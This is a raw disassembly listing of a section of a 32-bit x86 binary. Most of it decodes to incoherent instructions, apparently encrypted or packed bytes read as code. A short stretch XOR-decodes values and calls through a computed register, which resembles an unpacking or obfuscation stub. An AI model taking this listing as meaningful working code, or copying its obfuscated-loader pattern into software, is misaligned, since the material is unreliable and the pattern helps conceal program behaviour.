  40ddb3:	and    cl,BYTE PTR [eax-0x38f991db]
  40ddb9:	mov    ch,0x34
  40ddbb:	addr16 dec edi
  40ddbd:	jp     0x40de00
  40ddbf:	(bad)  
  40ddc0:	shl    ch,1
  40ddc2:	lahf   
  40ddc3:	dec    ecx
  40ddc4:	ror    BYTE PTR [esi+0xd1a7af9],0x91
  40ddcb:	sbb    eax,0xdbe59ca8
  40ddd0:	test   DWORD PTR [ebx-0x6e],0x18b21451
  40ddd7:	pop    ecx
  40ddd8:	fnsave [ecx]
  40ddda:	pop    es
  40dddb:	jnp    0x40de36
  40dddd:	cli    
  40ddde:	xchg   edx,eax
  40dddf:	data16 int3 
  40dde1:	xchg   ecx,eax
  40dde2:	mov    BYTE PTR [esi-0x55442e16],ch
  40dde8:	or     BYTE PTR [esp+ebx*4],ch
  40ddeb:	sub    eax,DWORD PTR ds:0xd4b989a3
  40ddf1:	mov    esi,0x82beb879
  40ddf6:	lahf   
  40ddf7:	lock jno 0x40dda5
  40ddfa:	daa    
  40ddfb:	ret    0xc282
  40ddfe:	pusha  
  40ddff:	jecxz  0x40dd82
  40de01:	adc    DWORD PTR [eax],edx
  40de03:	inc    edx
  40de04:	mov    esp,0xaa815cf2
  40de09:	xor    eax,0xdbe2b147
  40de0e:	(bad)  
  40de0f:	sub    eax,0x5cde8844
  40de14:	mov    DWORD PTR [ebp+0x8],eax
  40de17:	mov    eax,DWORD PTR [ebp-0x18]
  40de1a:	mov    edx,DWORD PTR [ebp+0x14]
  40de1d:	xor    eax,ecx
  40de1f:	add    eax,esi
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx+0x2a4ba876],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40de95
  40de8e:	dec    esi
  40de8f:	mov    bl,0x5c
  40de91:	and    edx,eax
  40de93:	retf   
  40de94:	adc    eax,0x8a8f554b
  40de99:	mov    ebx,0x80efb08c
  40de9e:	and    eax,0x6b2a61e5
  40dea3:	jl     0x40df13
  40dea5:	adc    DWORD PTR [edx],esp
  40dea7:	push   eax
  40dea8:	jg     0x40dec6
  40deaa:	or     al,0x19
  40deac:	jmp    DWORD PTR [edi-0x353b8150]
  40deb2:	or     BYTE PTR [edi+edi*2-0x2074651e],cl
  40deb9:	adc    eax,0x77bdd29a
  40debe:	out    dx,al
  40debf:	jns    0x40df17
  40dec1:	pop    esi
  40dec2:	sub    ebp,ebp
  40dec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dec5:	mov    DWORD PTR ds:0x5577909e,eax
  40decb:	pop    es
  40decc:	push   edi
  40decd:	icebp  
  40dece:	inc    esp
  40decf:	adc    ebx,ecx
  40ded1:	or     eax,0x73f4cd7d
  40ded6:	test   ebx,esi
  40ded8:	mov    cl,0x5a
  40deda:	leave  
  40dedb:	pushf  
  40dedc:	daa    
  40dedd:	loope  0x40de73
  40dedf:	mov    WORD PTR [edi],cs
  40dee1:	cmp    DWORD PTR [ecx],0x57
  40dee4:	mov    bh,0x8c
  40dee6:	mov    dh,0x26
  40dee8:	aam    0xbd
  40deea:	scas   eax,DWORD PTR es:[edi]
  40deeb:	popa   
  40deec:	rcl    BYTE PTR [edi+esi*1],1
  40deef:	push   es
  40def0:	stc    
  40def1:	loopne 0x40de9e
  40def3:	sar    BYTE PTR ss:[esi],1
  40def6:	dec    esi
  40def7:	inc    esi
  40def8:	add    eax,0x6d09052e
  40defd:	rcl    DWORD PTR [esi],0xa3
  40df00:	nop
  40df01:	icebp  
  40df02:	jo     0x40df1f
  40df04:	push   ebx
  40df05:	xor    BYTE PTR [ebp-0x4e8239af],al
  40df0b:	mov    esi,DWORD PTR [edi]
  40df0d:	inc    ebx
  40df0e:	cmp    DWORD PTR [ebp+esi*8+0x4b],esi
  40df12:	out    0xd,eax
  40df14:	xor    BYTE PTR [ebp+0x61],dl
  40df17:	dec    ecx
  40df18:	(bad)  
  40df19:	sub    al,0xda
  40df1b:	test   eax,0xa7c9eada
  40df20:	test   eax,0xfbea4578
  40df25:	dec    edi
  40df26:	jg     0x40df4b
  40df28:	scas   eax,DWORD PTR es:[edi]
  40df29:	scas   al,BYTE PTR es:[edi]
  40df2a:	push   cs
  40df2b:	in     al,0xca
  40df2d:	fcomp  DWORD PTR [esi+0x61463a4a]
  40df33:	aas    
  40df34:	fisubr DWORD PTR [eax-0x3fd837ac]
  40df3a:	cmp    DWORD PTR [edi+0x6f2c8600],edi
  40df40:	pop    edx
  40df41:	fwait
  40df42:	push   eax
  40df43:	rcl    DWORD PTR [eax-0x2],0xbb
  40df47:	add    eax,edx
  40df49:	pop    DWORD PTR [ebx]
  40df4b:	xchg   esi,eax
  40df4c:	ret    0xf26a
  40df4f:	xchg   edi,eax
  40df50:	xor    eax,0x7beccb87
  40df55:	jne    0x40df94
  40df57:	inc    ebp
  40df58:	mov    edi,0x70da14e7
  40df5d:	add    dh,BYTE PTR [esi-0x43]
  40df60:	imul   esp,ecx,0xee551376
  40df66:	aas    
  40df67:	xchg   BYTE PTR [edx+ecx*4],al
  40df6a:	or     BYTE PTR [edi],al
  40df6c:	aam    0x56
  40df6e:	mov    BYTE PTR [esi],dl
  40df70:	iret   
  40df71:	xchg   edi,eax
  40df72:	inc    bp
  40df74:	sbb    bl,BYTE PTR [ebx+0xc]
  40df77:	or     DWORD PTR [edi],ecx
  40df79:	inc    ebp
  40df7a:	mov    ebx,0x1c554100
  40df7f:	xchg   ecx,eax
  40df80:	cdq    
  40df81:	sbb    bh,BYTE PTR [ecx+0x21f4e23e]
  40df87:	xor    dh,BYTE PTR ds:0xa28d4213
  40df8d:	test   al,0x19
  40df8f:	push   cs
  40df90:	iret   
  40df91:	(bad)  
  40df92:	arpl   WORD PTR ds:0x168067de,bx
  40df98:	clc    
  40df99:	jbe    0x40df2c
  40df9b:	push   0xf4eccb8f
  40dfa0:	inc    eax
  40dfa1:	sbb    edi,DWORD PTR [esi]
  40dfa3:	pop    esp
  40dfa4:	(bad)  
  40dfa6:	mov    BYTE PTR [ecx+0x36],0x8
  40dfaa:	pop    ss
  40dfab:	pop    ss
  40dfac:	outs   dx,BYTE PTR ds:[esi]
  40dfad:	and    eax,DWORD PTR [esi]
  40dfaf:	scas   al,BYTE PTR es:[edi]
  40dfb0:	test   DWORD PTR [edx],0xb53a3389
  40dfb6:	jne    0x40df6a
  40dfb8:	add    BYTE PTR [ebx-0x79],0xcb
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
